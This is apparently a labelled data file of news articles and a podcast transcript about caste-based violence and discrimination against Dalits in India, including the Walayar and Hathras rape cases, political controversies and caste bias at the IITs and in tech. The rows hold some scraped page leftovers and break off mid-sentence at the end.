1," Almost 11 months after Kerala HC allowed a retrial plea in the Walayar rape case, the minor victims’ parents have been forced to demand justice at Secretariat. Dalit teenaged sisters raped and murdered – all accused, having suspected links with Marxist party leaders, acquitted due to shoddy probe by Kerala police… Massive outrage is building up in Kerala civil society following the acquittal of all four persons in the rape and death case of two minor girls, who were siblings, at Walayar in Palakkad district of the Kerala in 2017. The elder sister, aged 13, was found hanging in her house on January 13, 2017. Within two months, the younger sister, aged 9, was also found hanging in her house on March 4, 2017. Both of them belonged to Scheduled Caste community. As per the postmortem reports, both the girls were subjected to sexual assault. The autopsy report in the case of the younger girl even suggested the possibility of homicidal hanging. The police however did not explore the angle of murder, and final report was submitted against four accused – V Madhu, M Madhu, Shibu and Pradeep Kumar- for offences of abetment of suicide, rape and unnatural sex under the Indian Penal Code and penetrative sexual assault under the POCSO Act. There is one more accused, who is a juvenile and proceedings against him are progressing in the Juvenile Justice Board. The Special POCSO Court, Palakkad had acquitted one of the accused Pradeep Kumar on September 30. The other three accused were acquitted by the Special Court on October 25. The acquittals in this case have jolted the society, with complaints arising from several quarters that the probe in the case was deliberately sabotaged. The appointment of Advocate N Rajesh, who appeared for the accused in the case for long time, as the Chairman of the Child Welfare Committee during the pendency of the trial added to the controversy. It was only after his appointment as CWC Chairman that he relinquished the brief of the accused in the case. Rajesh was removed as the CWC Chairman on Monday following the furore. The case got echoed in the Kerala Legislative Assembly on Monday with the opposition highlighting the lapses in investigation and prosecution. The Chief Minister Pinarayi Vijayan stated in the floor of the assembly that the government will examine if there are any such lapses and will decide on the need for a re-investigation or CBI probe. The government would appeal against the verdict and seek the services of an experienced lawyer, the CM added. While the copy of the judgment acquitting three accused on October 25 is awaited, the judgment dated September 30 which acquitted Pradeep Kumar has been released. A look at the judgment will reveal that the case was built on weak evidence. “I have no hesitation to hold that the prosecution has miserably failed to prove the alleged offences against the accused beyond reasonable doubt”, observed Judge Muralee Krishna S, 1st Additional Sesssions Judge, Palakkad, in the judgment acquitting Pradeep Kumar. The case was completely based on circumstantial evidence. The Court observed that the police had no case that the girl had died other than by way of suicide. “Neither the prosecution nor the defence has a case during evidence that the girl died not by committing suicide”, the Court said. No direct evidence of sexual abuse Pradeep Kumar was residing in a rented house about 100 meters away from the girls’ family. It was established in trial that he used to give tuition classes to the girl at his home. The sexual abuse of the girl by Pradeep Kumar was sought to be proved through the depositions of three young women who were examined as Prosecution Witnesses 9, 10 and 12. They told the Court that the elder sister confided in them that Pradeep Kumar had exhibited his nudity to her. The witnesses stated that the victim had became scared and perplexed when she encountered Pradeep Kumar on way. PW12 added that the girl told her that the accused had once locked her in a room and asked her to click his nude pictures from his mobile phone. The Court however disbelieved their statements based on contradictions regarding the timing of the girl’s statements about the accused. In fact, two of them – PW9 and 11 – had turned hostile during trial. According to PW9, the girl told about the accused when they were out together for canvassing votes for legislative assembly elections. PW10 said that the statements were made by the girl when they were canvassing for a student political organization. As per PW12, her mother was contesting in the Panchayat elections and the victim girl had accompanied her for election work. The statements about the accused were made then, PW12 said. “This contradiction in the depositions of these witnesses is sufficient to doubt the genuineness of the depositions”, the Court said. The Court also noted that the statements made by PW12 regarding the accused giving the deceased a mobile phone to click his nude photos were not found in her statement given to the police under Section 161 CrPC. This omission was treated as a material contradiction by the Court. In this regard, the Court referred to the precedent laid down by SC in Subhash v State of Haryana which stated that a significant omission made by a witness in the statement given to police under Section 161 can amount to a contradiction. Also, as per PW12’s statement, the victim girl told about the accused during Panchayat election work, which took place in 2015. However, the accused started residing near the victim’s house only from January 2016. From this, the Court concluded that PW9, 10 and 12 were “planted witnesses” who were “deposing falsehood before the Court with a view to help the prosecution”. The parents of the girl had not given any statement of witnessing her being subjected to sexual assault by Pradeep Kumar. Their evidence was only based on hearsay from PW9, 10 and 12. No scientific evidence: The judgment noted that scientific evidence was lacking in the case. “no semen or spermatozoa could be collected either from the specimen collected from the deceased girl or from the dresses of the accused. There is absolute absence of scientific evidence to connect the accused with the alleged offence.” Another crucial factor which tilted the balance in favour of the accused was the statement given by the Dr Priyatha, the forensic surgeon who conducted the post mortem of the girl, during cross examination that the anal injuries of the girl could be due to piles infection. Based on this, the Court held that there was no conclusive proof that the girl was subjected to anal penetration. “PW11, the Assistant Surgeon of Forensic Department who conducted the post mortem examination though opined that the injuries noted in the anal canal of the girl could be due to anal penetration, she gave an alternative opinion also to the effect that it could be the result of an infection in the region. The opinion given by the doctor after post mortem examination is not the conclusive proof to say that the girl was subjected to anal penetration. An expert evidence can be used only for the purpose of corroboration. In this case, there is absence of substantive evidence to be corroborated by the opinion evidence given by PW11. More over, her deposition itself shows that an alternative opinion of infection in the anal region of the girl was also given by this expert”. The Court also observed that there was force in the argument of the defence that the statements of the witnesses were manipulated by the investigating officer after taking the accused into custody. Further, the Court discarded the facts projected by the prosecution to show discovery of information pursuant to confessional statement of the accused as per Section 27 of the Indian Evidence Act. The prosecution stated that the place of commission of offence was told to the police by the accused. Further, the prosecution stated that the clothes worn by the accused at the time of offence were also shown to police by him. But the Court said that in order to accept the confessional statement under Section 27, the facts discovered should be within the exclusive knowledge of the accused. Here, the the statements of PW9, 10 and 12 had mentioned about the alleged place of crime even before the confession of the accused. Also, there was no scientific or other evidence to show that the clothes claimed to have been discovered based on the confession of the accused were the ones which were worn by him at the time of crime. “Hence the alleged disclosure statement of the accused is also not helpful for the prosecution”, observed the Court in this regard. The Court said that in the entire chain of circumstances only two circumstances could be proved by the prosecution. One, the accused had been residing near the house of the victim in a rented house. Two, the accused had an opportunity to commit an offence against the victim girl when she had visited his house either for playing or for obtaining tuition. “But there is absence of any other circumstance to link the accused with the commission of the alleged offence”, the Court held while acquitting Pradeep Kumar of offences under Section 376(2) (i) and (n), 377, 305 and 354 of IPC and Section 5(1) read with 6 and Section 7 read with 8 of POCSO Act and Sections 3(1)(w)(i) and 3(2)(v)(a) of the SC/ST Prevention of Atrocities Act."
1," Almost 11 months after Kerala HC allowed a retrial plea in the Walayar rape case, the minor victims’ parents have been forced to demand justice at Secretariat.

1,"Hathras case: Ahmedabad sanitation workers abstain from work in protest against Dalit woman rape-murder As many as 20,000 sanitation workers of the Ahmedabad Municipal Corporation (AMC) on Tuesday abstained from work in protest against the alleged gang-rape and death of a Dalit woman in Uttar Pradesh's Hathras, a union leader said. While the Ahmedabad Municipal Servants' Association (AMSA), the apex body of sanitation workers in the city, claimed their one-day ""strike"" to be successful, a senior civic official said that normal work was not affected. ""Not everyone was absent during today's strike. Many workers came for their work in the morning and left after giving a memorandum. It can not be termed as a full-fledged strike. Since our work was not hampered, we haven't made any alternative arrangements,"" said Deputy Municipal Commissioner CR Kharsan. AMSA general secretary Kalpesh Makwana claimed all the 20,000-odd workers didn't attend their work. A memorandum was also handed over to district collector seeking justice for the Hathras victim, he said. Workers from Jamnagar and some other towns from Saurashtra region also reportedly abstained from work.

1,"Uttar Pradesh: Amid all the chaos over the gang-rape and murder of a young Dalit woman by upper-caste Hindu men in Hathras area of Uttar Pradesh state in India, Congress leaders Rahul Gandhi and Priyanka Gandhi met the victim’s family on Saturday evening and said that their party stands with the aggrieved family. Consoling the victim’s mother, Priyanka Gandhi, who serves the party as General Secretary for Eastern UP, said that she and her party (Congress) will together stand strong in the face of injustice against the family. “The family couldn’t see their daughter for the one last time. UP CM Yogi Adityanath should understand his responsibility. Till the time justice is delivered, we’ll continue this fight,” a report by Hindustan Times quoted her as saying after meeting the family. Rahul Gandhi said that the government of UP must protect the grieving family. “I stand with the family. It is the responsibility of the state government to ensure their safety,” he said. The leaders stayed with the family for over an hour after they reached Hathras around 6: 45pm following a series of dramatic events, including their detainment by the UP Police on Thursday on grounds of violating Section 144 and the pandemic law. On this afternoon, amid the restrictions, both the Congress leaders were stopped while on their way to Hathras. Reports said that Vadra played the role of protector during a brief clash between Congress workers and Uttar Pradesh cops at the toll plaza on the Delhi-Noida Direct (DND) Flyover, as the workers were not being allowed to move ahead. In a video story published by NDTV, Vadra can be seen hopping a small yellow barricade and rushing to shield a man in a white kurta as cops with raised lathis surround her and a horde of reporters cover the ruckus. Despite the huge chaos Vadra can be seen standing resolutely between the man, who appeared to be injured, and the police, despite considerable pushing and shoving, helping him to sit down by the side of the road and standing by his side. Vadra and her brother, Rahul Gandhi, were at the toll plaza on the DND to make a second attempt to travel to Hathras and meet the family of the victim. The Congress leaders’ first attempt, on Thursday, ended in a tussle with cops who refused to let them pass, citing orders banning large gatherings amid coronavirus concerns, and shoving him to the ground in the chaos that followed. This time, though, facing severe criticism over its handling of the tragedy and the physical confrontation with Gandhi, the Yogi Adityanath led UP government backed down, allowing the Gandhis and two senior Congress leaders to proceed, the report said. This was hours after two top UP officials first met the family – the first visit by high-ranking officials since the assault on September 14. The UP government had previously insisted that large gatherings – such as those of the Congress delegation – were not allowed in line with COVID management guidelines. These orders prohibit people from travelling in groups of more than five. The ruling BJP, is under pressure over its apparent inability to prevent horrific crimes against women and at least two more assaults and rapes have been reported from the state since then. Amid the curbs and demand by the opposition parties and social activists that UP Chief Minister Yogi Adityanath must resign for not being able to manage the crisis, the CM made a declaration of his government’s commitment on Friday. “Those who even think of harming mothers and daughters in UP, their destruction is assured,” he tweeted in Hindi. In the meantime, the Chief Minister of UP Yogi Adityanath recommended Central Bureau of Investigation (CBI) probe into the case. On Friday, the CM had suspended Hathras superintendent of police Vikrant Vir and three other police officers for their handling of the case. Furious protests against the police and the government have been staged across the country, including one in Delhi on Friday, where Chief Minister Arvind Kejriwal made an appearance and demanded that the four accused, who are all from the so-called “upper caste”, be executed. Meanwhile, the Allahabad High Court has taken notice of the case and has summoned top officials of the government and police to appear before it on October 12.  Free Press Kashmir is now on Telegram.

1,"Spectre of Caste? At Dalit AIADMK Legislator’s Wedding, Brahmin Bride’s Father Attempts Suicide By Arré Bench Oct. 06, 2020 A wedding is supposed to be a happy ceremony celebrating the union of a couple. But in Tamil Nadu’s Kallakurichi, the wedding of 35-year-old All India Anna Dravida Munnetra Kazhagam (AIADMK) legislator A Prabhu to 19-year-old student S Soundarya took a dark turn when the bride’s father turned up at the wedding venue and threatened to set himself on fire. The father, S Swaminathan, said he was opposed to the marriage because Prabhu had “lured” his daughter into marriage, and had been grooming her since she was a minor. Prabhu has denied this allegation, saying that Soundarya and he have been in a relationship only for the past four months, and chose to get married despite Soundarya’s family disapproving of the match. AIADMK Dalit MLA's inter-caste marriage stirs controversy as wife's family opposes https://t.co/D3EY9YnvMK — Anna Isaac (@anna_isaac) October 6, 2020  Swaminathan, who is 48 years old, was prevented from immolating himself by the guests and AIADMK workers present at the wedding and handed over to local police. He was then booked under the Indian Penal Code Section 309, relating to attempt to suicide. In response to Swaminathan’s allegations, Prabhu released a video where he is sitting next to Soundarya as he explains their joint decision to get married despite her family’s opposition. 36-yr-old Kallakurichi MLA Prabhu clarifies that neither did he kidnap nor force 19-yr-old Soundarya into marrying him. His inter-caste wedding with her, a brahmin woman, has created a storm in TN @thenewsminute pic.twitter.com/84TfyYamZd — Anjana Shekar (@AnjanaShekar) October 6, 2020  The girl’s father says he is opposed to the union because of the age gap of 17 years between Prabhu and Soundarya. Swaminathan, who is a temple priest, has denied that caste identity played any role in his opposition to Prabhu, a Dalit, marrying his daughter. In a Times of India report, Swaminathan said, “Though we are Brahmins, for 14 years, Prabhu grew up in my house and I considered him my son. But he broke that trust.” He has now approached the court for a hearing in the matter. AIADMK Dalit MLA's inter-caste marriage stirs controversy as wife's family opposes. This has created major drama. The woman's father has just now approached court alleging she was abducted. Meanwhile, MLA has published a video https://t.co/e7Wtyx8Sgz — Dhanya Rajendran (@dhanyarajendran) October 6, 2020  Swaminathan is not the only one who is disturbed by the age gap between Prabhu and his new bride. On social media, many users have pointed out that the 17-year difference between the two is out of the ordinary. Though Prabhu has denied the claims that he was pursuing a relationship with Soundarya when she was a minor, not everybody is convinced. I'm really uncomfortable with the age gap though. She's only 19 and he's 36. AIADMK Dalit MLA's inter-caste marriage stirs controversy as wife's family opposes https://t.co/guYewDu4Qi — Arya (@RantingDosa) October 6, 2020  From bride abduction, to possible casteism, grooming of a minor, and finally attempted suicide Prabhu and Soundarya’s wedding day is the opposite of a fairytale. Arré Bench The Arré bench delivers stories that mattress. It hasn't achieved much sofar. But it's getting bedder.  Did you like it? Tell us what you think so we can give you more content you like : There are a slew of Instagram accounts run by media professionals dedicated to irritants and inside jokes of their job and industry. Lately, the conversation has slowly moved from the likes of “This client said this silly thing” to “My agency promotes mental health as long as it involves a yoga class, not reasonable work hours or manageable workloads. Haha. Fun.” This shift from LOLs and low-key whining to simmering aggression about toxic work culture during the pandemic is an eye-opener. We’ve all heard of Javed Khan, the rickshaw driver who sold his wife’s jewellery to convert his vehicle into a mobile ambulance. Though heartening, these tales of sacrifices make me gloomy. Each one of these positive stories come with the unsaid failure by the state or those in a better position to help. As the second wave continues to batter India, “woke” media organisations and ad agencies are all about well-being and mental health. The problem arises when this performance of empathy does not extend to their employees. Stories of bosses expecting you to work beyond office hours and making one demand after another on WhatsApp groups are all too common. There are several reasons why this second wave of the coronavirus may prove to be more lethal than the first one. Most of it has to do with Indian behavioural impulses. Indians haven’t been able to stand in a queue for the longest of time and it comes as no surprise that the pandemic-taught etiquette has worn off. In Dwarka, a man was so angry with his mother for getting into an argument with a neighbour that he slapped her in public. She died.

1,"Bhopal: Congress leader Kamal Nath landed himself in the soup when he used the word 'item' for Madhya Pradesh Women and Child Development Minister Imarti Devi. Madhya Pradesh Chief Minister Shivraj Singh Chouhan has written a letter to Congress’ interim chief Sonia Gandhi in this regard, asking her to take action against Kamal Nath. Notably, former Madhya Pradesh chief minister Kamal Nath made the controversial remark on Sunday during campaigning for the upcoming bypolls. While speaking in Gwalior district’s Dabra segment, Kamal Nath had allegedly called Imarti Devi an 'item'. Notably, bye-elections for 28 Madhya Pradesh Assembly seats will take place on November 3 and the counting of votes will occur on November 10. In the letter, Chouhan mentioned that he thought Sonia Gandhi would not only condemn her party leader’s statement over a Dalit woman but also take a strict action against him. “But you have not done anything like this so far,” wrote Chouhan. The senior BJP leader also said that despite the fact that Kamal Nath’s remarks are being slammed by the media across the country, the Congress leader is defending his “indecent” and “condemnable” remark. Taking note of Imrati Devi’s ‘tearful’ response to Kamal Nath’s statement, Chouhan added that “disrespecting a Dalit woman like this tarnishes your politics”. “Remove Kamal Nath immediately from all party posts and condemn his statement strongly. If you fail to react, I will be compelled to believe that you support it,"" said the letter.  Shivraj Singh Chouhan sat on a silent fast (protest) for two hours in Bhopal earlier today to protest against Nath’s statement. Later, the MP CM said: “Madam Sonia Gandhi, a leader of your party, a former CM has made such a comment. Is it okay? Do poor women have no respect? Madam, if you think the remark was wrong, what action will you take? I'm writing to you, you make a decision.” Chouhan also accused Kamal Nath of crossing “limits of shamelessness”. “I expected a clarification, but the statement is being shamelessly justified. You can abuse me, call me names, but such a comment about a woman is against every daughter & mother. Women have been disrespected during Navratri. He (Kamal Nath) crossed limits of shamelessness,” said Chouhan. Imarti Devi was earlier a part of the Congress. She joined the BJP earlier this year.

1,"Over 60 diaspora groups, feminist and Dalit in the United Kingdom have urged the UNHRC (United Nations Human Rights Commissioner) Michelle Bachelet to ask Prime Minister of India Narendra Modi to dismiss Uttar Pradesh Chief Minister Yogi Adityanath in view of the outrage over the alleged gang-rape of a 19-year-old Dalit girl last month by four upper-caste men in Hathras district of the Bharatiya Janata Party-ruled state. And to set up an international enquiry into the Hathras rape case and other rapes and crimes against women, particularly Dalit and oppressed caste women in UP since the Yogi government came to power in the state. The full text and signatories are below: To the United Nations High Commissioner for Human Rights, Michelle Bachelet Dear Ms Bachelet, We are writing to you to express our deep sense of shock and dismay at the terrible events unfolding in Uttar Pradesh, India and to urge you to take action as outlined below. Recent events On 14th September a 19-year-old Dalit woman was gang-raped and assaulted with inhuman violence in Hathras in Uttar Pradesh (UP). Her spine was broken, paralysing all her limbs, her body grievously bruised and her tongue was brutally wounded. The four men who had raped and assaulted her were oppressor caste Thakurs who dominated the village she lived in – a place which continues to practice ‘untouchability’. They had allegedly been ruthlessly harassing her for a considerable length of time, to the extent that she was afraid of leaving her home. But worse was to come. The UP police, initially reluctant to register a case against the four accused, left her lying on the concrete floor of the police station and when she was eventually taken to a hospital she was left in a generic ward. Only after pressure built up was she transferred to the ICU and later to Delhi’s Safdarjung Hospital, where she passed away on 29th September. But even this scale of cruelty was not enough for the police and administration of UP and the local government led by Chief Minister Yogi Adityanath which gave them their orders. On the night of 30th September, they took away her dead body. Her mother’s pleas to be allowed one last look at her were ignored. Then, barricading her family in their house so they could not attend or perform funeral rites, the police forcibly and hurriedly cremated her body at 2:30 am to erase all evidence in the case. Not isolated events What is most shocking is that far from being an isolated crime, this is part of a systematic attack on women and oppressed castes. Three other sexual assaults and deaths of women and girls took place in UP hardly 24 hours after the Hathras victim’s remains had been consigned to flames by the UP police. In Balrampur a 22-year-old Dalit woman was raped and murdered. In Bhadohi, a 14-year-old Dalit girl was found dead, her face disfigured and head battered – rape is suspected – and in Azamgarh an 8-year-old girl was raped. While attacks on Dalits and women have escalated vastly all over India since 2014, when the Hindu-supremacist Modi regime with its entrenched Casteist and misogynist ideology came to power, the Adityanath government in UP has seen by far the largest number of attacks and atrocities. For example, in 2019, India reported 4,05,861 cases of crimes against women with Uttar Pradesh topping the list with 59,853 such incidents, according to India’s annual National Crime Record Bureau’s “Crime in India” 2019 report. As for the atrocities against Dalits and other oppressed castes, they too have escalated vastly and oppressor castes have been allowed to act with total impunity. For example, according to the National Crime Record Bureau figures, in 2016, Uttar Pradesh reported the highest number of atrocities against Dalits – 26% of all cases reported. We are deeply concerned about where this is leading India and more specifically the state of Uttar Pradesh. We hope you are able to take action: The signatories of the open letter are over 30 feminist groups, all the Dalit organisations in the UK and many other of the diaspora groups like CasteWatch UK, South Asia Solidarity Group, National Valmiki Sabha, NRI UK, London Black Women’s Project and several Ambedkar International Missions in different countries.

The hasty and forceful cremation of the victim’s body by the Uttar Pradesh police has sent shock waves across India and indeed around the world. The inhumanity of the crime was amplified by the brazenness of the state government’s attempt to shield the perpetrators. The indifference shown to the value of human life by those in positions of power was the focus of the ire and outrage by protesters at the rally. The protest was organized by the New Jersey unit of IAMC, and was supported by members of other civil society groups such as Hindus for Human Rights, India Civil Watch, Sadhana, Students Against Hindutva Ideology, Muslims for Progressive Values, MANAVI, Dalit Solidarity Forum and Global Indian Progressive Alliance among others.

1,"Police said the woman, who was allegedly raped by three men four days ago, committed suicide on Friday. A policeman has been arrested in Madhya Pradesh's Narsinghpur district for allegedly not registering a Dalit rape victim's complaint for four days, following which she ended her life, a top officer said on Saturday. The arrest was made after Chief Minister Shivraj Singh Chouhan took serious cognisance of the alleged lapse and ordered that a case be registered against the local police official. Two senior officials were also shunted out as per the orders. The woman, who was allegedly raped by three men four days ago, died by suicide on Friday, police said. An official in Bhopal said that Chouhan had ordered on Friday night that Assistant Inspector of Police (ASI) Mishrilal Kodapa of Gotitoriya police outpost in Gadarwara tehsil, some 50 kms from Narsinghpur district headquarters, should be booked and arrested for not registering the victim's complaint of gang-rape. Besides, as per the orders, Additional Superintendent of Police (ASP) Rajesh Tiwari and Gadarwara Sub Divisional Officer of Police (SDOP) S R Yadav were shunted out from Narsinghpur, he said. ""A case was registered against Kodapa and he was arrested under 166 (c) (public servant failing to record information) of IPC on Friday night,"" Jabalpur Zone Inspector General of Police Bhagwat Singh Chauhan told PTI. The ASP and the SDOP have been transferred from Narsinghpur, he added. Kodapa had been suspended on Friday after a video went viral in social media, in which the husband of the deceased woman accused the policeman of not registering a complaint of rape, police said. The man was purportedly heard saying in the audio- visual clip that instead of taking action in the case, he was held based on a complaint lodged by the accused and had to cough up Rs 50,000 as a bribe for his release. ""Three men identified as Arvind and Parsu Choudhary, who belonged to the same community as the victim, and another accused Anil Rai, allegedly gang-raped the 32-year old woman on Monday. They trio has been arrested,"" Narsinghpur SP Ajay Singh said. According to police, the accused allegedly raped the woman when she was in a field cutting grass for the cattle. The police, however, said on Friday that the woman's two nieces said that the accused caught hold of her and teased her, but did not confirm that she was raped. As per the girls' version, when they raised an alarm, the accused fled from the spot, police added. SDOP Yadav, who has been shunted out, had said on Friday that the woman and her husband had orally complained to the police on the same day but there was no clarity in the complaint. On Friday, when the victim went to fetch water from a tap, a local woman had allegedly taunted her, after which the victim returned home and hanged herself, police said. Police said they have have already arrested that woman. ""Besides, Motilal, Arvind's father, too, was arrested under IPC section 306 (abetment of suicide) as he had said something insulting to the woman,"" Yadav had said. After the Dalit woman hanged herself, the police registered a case of gang rape against the three accused on Friday after four days. This news piece may be triggering.

Don't miss out on the latest News Bijay Kumar Minj, New Delhi Updated: October 15, 2020 09:32 AM GMT Dalit Christians and activists from across India protest in New Delhi on Aug. 10, 2019, demanding that the government give them the same rights as enjoyed by their Hindu counterparts. (Photo: Bijay Kumar Minj/UCA News)  Police in the northern Indian state of Uttar Pradesh have arrested a man suspected to have thrown acid on three Dalit minor sisters in Gonda city. Ashish Chaurasiya was arrested after a brief exchange of fire with police on Oct. 13, police said on Oct. 14. However, the suspect’s mother Laxmi said her son was framed by police and has demanded a probe by the Central Bureau of Investigation. Chaurasiya was arrested after soon after Yogi Adityanath, the state’s chief minister, called for tough action against those responsible for the acid attack. The sisters, aged 8, 12 and 17, were attacked while they were sleeping. While two received minor burn injuries, one has more serious injuries on her face. They are all stable in hospital. “Last month’s gang rape of a Dalit girl in the state who later died was not even forgotten and now more Dalit girls have been attacked. Very unfortunate and highly condemnable. It is a cruel and inhuman act,” Father Vijay Kumar Nayak, secretary of the Indian bishops’ office for Dalits and lower classes, told UCA News. “There are several reasons why all of sudden we are hearing the news of atrocities on people of Dalit origin. The main reason is their socioeconomic condition because the accused person knows that Dalits cannot revolt.” Father Nayak said Dalits are always on the receiving end of mistreatment from other people and the government. “People take them for granted that they are here to be suppressed, which is very dangerous for a democratic country like India,” the priest said. “There is a trend that if you attack Dalits you will become famous among your community. Another threat is that people who support Dalits and minorities are targeted by so-called elite groups who brand them as anti-national.” Attacks on Dalits have been common in India recently. In July, the tonsure of Vara Prasad by police in East Godavari district of Andhra Pradesh state became national news with even the president of India taking note of it. Also in July, Dalit youth Yericharla Kiran died in police custody in Prakasam district of Andhra Pradesh after he was detained for not wearing a face mask. In neighboring Tamil Nadu state, a 63-year-old Dalit father and his 31-year-old son died in police custody in June. Mukti Prakash Tirkey, editor of a weekly newspaper in New Delhi, said there is no fear among people about breaking the law in cases involving Dalits, tribal people and minorities. “Unless the mentality of people changes towards their fellow brethren that in front of the law we all are equal and all Indians are my brothers and sisters, we can hear the news of Dalit and tribal atrocities every other day,” the human rights activist said. Dalits, or untouchables, are the lowest caste within Hindu society. Huge numbers of Dalits have converted to Christianity and Islam over the decades, though in reality the religions offer limited protection from societal prejudice. The word Dalit means ""trampled upon"" in Sanskrit and refers to all groups once considered untouchable and outside the four-tier Hindu caste system. Government data shows 201 million of India’s 1.2 billion people belong to this socially deprived group. Some 60 percent of India's 25 million Christians are of Dalit and tribal origin.

Editor's note: Firstpost is holding a series of conversations with Indians in the US, across its campuses, offices and households, to understand how caste discrimination pervades the community just as much as it does back home in India. Hosted by Thenmozhi Soundararajan, Dalit rights activist, artist, technologist and executive director of Equality Labs, the podcast cracks taboos about caste among Indians in the US. *** In Episode 2: Sam Cornelius is a Dalit technologist with years of experience working in multinational tech companies, both in India and in the US. In this episode of the podcast, Thenmozhi Soundararajan (@dalitdiva) speaks to Sam about his experience of casteism, from IIT in Mumbai to large tech companies in the US. *** Listen to Caste in the USA, Episode 2 here:  *** Read the complete transcript for Episode 2: Thenmozhi Soundararajan: Jai Bhim and Jai Savitri, everyone. I am Thenmozhi Soundararajan, and this is the series Caste In the United States with Firstpost. Today’s episode is a conversation with our colleague Sam Cornelius, who is a long-standing Dalit technologist and Ambedkarite, who has several years of experience working in multinational tech companies, both in India and in the US. He is going to talk with us today about his experience of caste in tech and what are the ways forward to eradicate this discrimination in the industry. Jai Bhim, Sam. It's wonderful to have you join us, welcome. Sam Cornelius: Thank you Thenmozhi for giving me this opportunity Thenmozhi: Let’s dig in, shall we? So when we talk about caste in tech, it is really important for our audience to understand where it begins. And I know for you Sam it really started with casteist educational institutions. You, for example, went to IIT Mumbai — where the defendants of the CISCO case also attended — and these institutes are notorious for their casteist cultures. Can you share your experiences? Sam: Thank you for asking the question. As you know, in the US diaspora, the word ‘caste’ is not known among people. If you are non-Indian especially the word ‘caste’ is not known. So thank you for bringing this issue to the forefront and giving me this opportunity. Yes, I did join IIT in the 1990s. I was surprised when I made it to the premier institute. It was a dream come true. When I joined IIT in my early teens, I was not aware of how the system works but now I understand how the system at that time was structured. In those days in IITs ragging was common, I am sure the practice still continues. On the first day of college, I had a feeling that the seniors who came to rag me knew my caste identity before I could decide whether I wanted to tell them or not. This became possible because when IIT brings out its ranks, students belonging to scheduled caste and tribes have separate ranks from general category students who get all-India ranks. So let’s say a general category student holds 1st, 2nd or 3rd position, their rank would be AIR 1, 2, or 3. Whereas in the case of a student who belongs to the scheduled castes or tribes and holds the 1st, 2nd or 3rd position, their rank would be SC 1, 2, or 3. Your roll number and rank is also put on the notice board and as a result, students, especially seniors, find out if you have come through the reservation. Before IIT, I went to Osmania University, Hyderabad. There you had only one rank for all students, so I did not understand why IITs had to come up with different ranks just because they provide affirmative action. That I didn’t understand but it's step one of IIT where they already have, by their ranks, differentiated. If I am not wrong, during those days even for answer sheets they used a different coloured answer sheet if you are from SC and ST category as opposed to non-SC and ST. At that time there was no OBC reservation but I am sure OBCs would come into the same thing now. So that’s where it starts from, which means, from the person who is correcting our answer sheets. When we asked them why different coloured sheets were used, they would reply by saying it makes things easy and cite many different reasons. So the different ranks and different coloured sheets, at the entry itself, ensure that you are discriminated against based on your caste. Thenmozhi: So Sam, just so it is clear for our audience, Dalit students who are reservation or affirmative action beneficiaries, have the fact that they are affirmative action students very publicly broadcasted through these many different ways that you just talked about. Whether it is your attendance number or examination answer sheet, the public nature of you being marked as a reservation student opens up a pathway for so much bullying and discrimination. It's also partially because with that information being made public people can now know whom to segregate and discriminate against. Is that right? Sam: Yes, based on your roll no. your rank is decided. In every IIT your roll no. and rank are put up on the notice board. An SC and ST student does not get an all Indian rank. When even writing entrance examinations, they also have different coloured answer sheets from general category students. I think the reason given to us for doing this was that it is done to give special consideration to Dalit students. I hope this practice does not happen today. I felt very odd amidst these practices. A coloured sheet may expose a student to a casteist professor who rather than being considerate may turn out to be biased. As a Dalit I always tell people we don’t need your favors, what we need are checks and balances, that will prevent people from dominating us and we will run. Such checks and balances will ensure that there is no way for people to discriminate us, and in case there is discrimination they should be scared that the law will hold them accountable. Till 12th standard, when I was living in Hyderabad, I had experienced no ragging. I used to go home, I was a day scholar. But in IIT I faced ragging for the first time. One evening my seniors came up to me and said: “Boss, I know who you are, so don’t try to fool me.” Upper caste students used different names to identify people belonging to scheduled castes and schedule tribes. Some of them would refer to us as ‘catus’ which was used to refer to students from a category. Others used to ‘suc-sut’ (ph) which is how they used to pronounce SC and ST. In front of us they would tell that these words mean something, but internally they used it to discuss, to identify people based on their caste. Thenmozhi: And Sam, I think I want to emphasise for our listeners here that the IITs are where people of privilege have their caste capital get converted into tech capital. Whereas, for our community, we are going there to be able to have a better life, for ourselves and for our families. When entering these very hostile places we know, from the work of Ambedkar-Periyar study circles at IIT Madras and IIT Mumbai, how deeply casteist these institutions are. We see complaints from both Dalit students, Dalit faculty and Dalit workers. In fact, in IIT Mumbai there was a professor called Rahul Deshmukh who had tortured and harassed two Dalit workers because they wanted to unionise. Their condition got so bad, that they tried to commit suicide on his doorstep. One of the things that they mentioned in their letter was how he told them, “this institute is not for Mahars and Bhangis, how dare you unionise, get out of here!” These things are reported in mainstream news but due to the impunity related to caste we know nothing will happen to the perpetrator of such atrocity. As a result, people who are of caste privilege just get bigger and bolder. The CISCO defendants who also went to IIT Mumbai, entered this environment where dominant caste people are kind of puffed up, where they get to talk about their bootstrap’s narrative which says - look we are just here because of merit. These same people then go on to create casteist alumnus networks that lead to them being part of internal referral networks into companies. Sam, can you talk a little about how these casteist schools led to casteist companies in the valley and throughout tech? Sam: I just want to say something here on the topic of suicides. As I was telling you from the moment you enter IIT, along with the students the professors know you are from the caste category. Once you have identified at the age of 18 or 19, you are out of their closed groups. So you feel isolated, a little bit. There are also no checks and balances to ensure that the professors are grading Dalit students fairly. Many Dalit students come from non-english speaking background but they may still perform well in exams. I have travelled across IITs and spoken to people, there is no SC/ST cell in any IIT, where students could seek help from a scheduled caste or scheduled tribe professor. In fact, there is no representation of scheduled caste and scheduled caste professors at all, and this might at the root of all discrimination. All faculty advisors are professors from the general category, who don’t understand our problems and we can’t tell our problems to them easily. Many students feel that if they complain these professors will think that despite getting concessions at the entry level they still want more concessions. So this leads to isolation. In case you are getting low grades, there is no support system that can bring these issues up which leads to more feelings of isolation. In my second year in IIT, there was a scheduled caste girl who burnt herself in her hostel. If you look at the statistic there is at least one case of suicide in all B-Tech undergrad courses across all IITs. In this if you include other premier institutes like AIIMS, NIIT you would have at least five suicides per year. The cream of our society don’t just enter tech industries but they also travel to different parts of the world. So it is in the interest of the country to have to know what caste discrimination is and ensure that every SC and ST person who enters their company scales up too. Most MNCs in India and abroad are headed by upper caste individuals. Since the issue of caste based discrimination is not addressed in premier institutes it travels across the world. When I was young I did not understand that I am not just a student but a representative of my community. There are only a few seats that are reserved for the SC and ST community, so when you get a seat because of your marks and skills, you no long remain just Sam but you become a representative of the entire community. So they bring down the whole community when they bring down Sam. And if one Sam commits suicide, the whole community also loses. If there is 15 percent reservation for scheduled castes and 7.5 percent reservation for scheduled tribes, even those minimum seats were not filled till 2015. This is only students, at the level of professors and others you will hardly find that there is even 1 percent of the seats in IITs, IIMs and AIIMS filled by professors belonging to the scheduled castes. So that same thing of discrimination because nobody has exposed 